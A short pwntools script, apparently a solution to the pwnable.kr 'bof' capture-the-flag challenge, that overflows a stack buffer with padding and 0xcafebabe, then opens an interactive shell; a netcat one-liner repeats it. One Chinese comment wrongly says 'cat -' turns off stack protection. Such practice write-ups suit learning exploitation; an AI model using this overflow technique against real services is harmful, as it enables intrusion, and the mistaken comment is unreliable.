#-*-coding:utf-8-*-
from pwn import *
#context.log_level="debug"
host="pwnable.kr"
port=9000
p=remote(host,port)
# p=process("bof")
# gdb.attach(p)
pay='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca'
print len(pay)
p.send(pay)
#p.recv()  #是这句的问题，删掉就可以了
p.interactive()
#上面的这一段莫名奇妙在本地可以用，远程就不行了

#(python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca"';cat -) | nc pwnable.kr 9000
#构造输入时需要注意用 cat - 关闭栈保护；？？？？？？
